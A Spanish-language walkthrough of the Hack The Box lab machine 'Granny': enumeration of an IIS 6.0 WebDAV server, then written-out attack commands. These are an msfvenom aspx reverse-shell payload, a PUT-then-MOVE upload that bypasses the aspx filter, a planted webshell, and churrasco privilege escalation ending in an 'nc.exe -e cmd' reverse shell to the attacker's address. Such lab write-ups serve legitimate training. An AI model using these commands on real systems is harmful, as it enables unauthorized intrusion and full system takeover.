# Máquina GRANNY
![](https://i.imgur.com/yY4gBdd.png)


# Reconocimiento

## Nmap

Se realiza un escaneo simple de los puertos abiertos en la máquina y solo muestra el puerto 80:
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# nmap -sS --min-rate 5000 -p- 10.10.10.15 -oG allPorts  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 10:32 -05
Nmap scan report for granny.htb (10.10.10.15)
Host is up (0.100s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 39.97 seconds

```
Lanzamiento de scripts básicos de reconocimiento y versión detectan un potencial riesgo:

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# nmap -sCV --min-rate 5000 -p80 10.10.10.15 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 10:36 -05
Nmap scan report for granny.htb (10.10.10.15)
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Wed, 19 Jan 2022 15:43:40 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
```

## Sitio Web - Puerto 80

### Web - IIS

![](https://i.imgur.com/EJXCaw5.png)


### Cabeceras
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# curl -X GET "http://10.10.10.15/" -I
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.10.10.15/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:392"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Wed, 19 Jan 2022 16:02:33 GMT
```

La respuesta de cabecera **X-Powered-By** nos indica aparentemente que se usa tecnología **ASP.NET**

# Enumeración

## Gobuster

Descubriendo directorios y archivos pero no se obtiene algo relevante:

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 100 -x ,.txt,.htm,.html,.asp,.aspx,.php -u http://10.10.10.15:80 | grep -v "Status: 500"              130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.15:80
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              htm,html,asp,aspx,php,,txt
[+] Timeout:                 10s
===============================================================
2022/01/19 11:49:39 Starting gobuster in directory enumeration mode
===============================================================
/_vti_bin             (Status: 301) [Size: 158] [--> http://10.10.10.15:80/%5Fvti%5Fbin/]
/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]                                   
/_private             (Status: 301) [Size: 156] [--> http://10.10.10.15:80/%5Fprivate/]  
/_vti_inf.html        (Status: 200) [Size: 1754]                                         
/_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]                                  
/_vti_log             (Status: 301) [Size: 158] [--> http://10.10.10.15:80/%5Fvti%5Flog/]
/_vti_bin/shtml.dll   (Status: 200) [Size: 96]                                           
/aspnet_client        (Status: 301) [Size: 161] [--> http://10.10.10.15:80/aspnet%5Fclient/]
/Images               (Status: 301) [Size: 152] [--> http://10.10.10.15:80/Images/]         
/images               (Status: 301) [Size: 152] [--> http://10.10.10.15:80/images/]         
/postinfo.html        (Status: 200) [Size: 2440]                                            
                                                                                            
===============================================================
2022/01/19 11:50:50 Finished
===============================================================

```

## Curl y Burpsuite

Se crea y se intenta subir un archivo prueba.txt a la web para comprobar el método PUT:
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# cat prueba.txt                                          
Hola Mundo

┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# curl -X PUT http://10.10.10.15/prueba.txt -d @prueba.txt
```

Se comprueba que se pueden subir archivos con extension txt:

![](https://i.imgur.com/SlKAC4g.png)

Pero no permite subir archivos aspx con el método PUT:

![](https://i.imgur.com/0Fc9p0r.png)

El método OPTIONS permite ver los métodos HTTP habilitados:

![](https://i.imgur.com/IEMrjjS.png)


# Obteniendo acceso

## Msfvenom

Creamos un payload malicioso con msfvenom:

```
┌──(root💀kali)-[/opt/Windows-Exploit-Suggester]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=445 -f aspx -o revershell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2716 bytes
Saved as: revershell.aspx
```

## Bypass en la subida de archivos aspx

Se crea un archivo txt con el payload malicioso (generado por msfvenom) en su contenido:

![](https://i.imgur.com/7TVaPMG.png)

El metodo MOVE permite renombrar (similar al comando **move** de Linux) el archivo revershell.txt a revershell.aspx:


![](https://i.imgur.com/PG4pySK.png)

Se envía una solicitud GET para que se ejecute nuestro payload:
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# curl -X GET "http://10.10.10.15/revershell.aspx"
```

Y se obtiene una revershell:

![](https://i.imgur.com/m9IccAL.png)


## WebShell
También se puede obtener una WebShell antes de conseguir acceso directo con msfvenom:

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# cp /usr/share/webshells/aspx/cmdasp.aspx . 
```

```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# curl -X PUT http://10.10.10.15/webshell.txt --data-binary @cmdasp.aspx 
```
```
┌──(root💀kali)-[/home/cr4y0/Escritorio/HTB/GRANNY]
└─# curl -X MOVE -H 'Destination:http://10.10.10.15/webshell.aspx' 'http://10.10.10.15/webshell.txt'
```

Se obtiene una webshell:

![](https://i.imgur.com/KA5smxa.png)


# Escalación de Privilegios

Esta máquina tiene un sistema operativo Windows Server 2003 el cual posiblemente posee muchas rutas para la escalada de privilegios:

![](https://i.imgur.com/ZOM5pXj.png)

En este caso se usará la vulnerabilidad que se incluye en el MS09-012.

## Subiendo binarios


Subiendo binarios a la web para la elevación de privilegios

![](https://i.imgur.com/j6Z6Sbl.png)

![](https://i.imgur.com/yQzb6kG.png)

Estos ejecutables se encuentran en la ruta **C:\Inetpub\wwwroot**

El binario se ha transferido exitosamente:
```
C:\Inetpub\wwwroot>churrasco "whoami"
nt authority\system
```
Se envía una cmd con nc hacia el puerto en escucha en nuestra máquina:
```
C:\Inetpub\wwwroot>churrasco "C:\Inetpub\wwwroot\nc.exe -e cmd 10.10.14.8 448"
```

## Revershell
Y ahora se obtienen privilegios de **nt authority\system**

![](https://i.imgur.com/FpL9cPF.png)

Y ya se pueden obtener las flags user.txt y root.txt

# Recomendaciones u anotaciones

1. Tener siempre en cuenta las **cabeceras de respuesta**.
2. El uso malintencionado de los **métodos HTTP** y el incorrecto manejo de estos pueden llevar a obtener un primer acceso.
3. **Burpsuite** ayuda a obtener un mejor entendimiento.
4. **Curl** permite subir binarios con su parámetro **--data-binary**
5. Considerar el método **MOVE** como alternativa.
6. Usar rutas absolutas en vez de rutas relativas.
7. **MS09-012** junto al binario **churrasco** sirvió para escalar privilegios.

# Enlaces

* Para entender la respuesta de cabecera **X-Powered-By**:

[https://stackoverflow.com/questions/33580671/what-does-x-powered-by-mean](https://stackoverflow.com/questions/33580671/what-does-x-powered-by-mean)

* Enlace del binario churrasco.exe:

[https://github.com/Re4son/Churrasco](https://github.com/Re4son/Churrasco)

* Writeups que me gustaron y ayudaron a tener un mejor entendimiento:

[https://0xdf.gitlab.io/2019/03/06/htb-granny.html](https://0xdf.gitlab.io/2019/03/06/htb-granny.html)

[https://ranakhalil101.medium.com/hack-the-box-granny-writeup-w-o-and-w-metasploit-f7a1c11363bb](https://ranakhalil101.medium.com/hack-the-box-granny-writeup-w-o-and-w-metasploit-f7a1c11363bb)

[https://bros10.github.io/posts/Granny/](https://bros10.github.io/posts/Granny/)

[https://www.youtube.com/watch?v=ZfPVGJGkORQ&t=318s](https://www.youtube.com/watch?v=ZfPVGJGkORQ&t=318s)

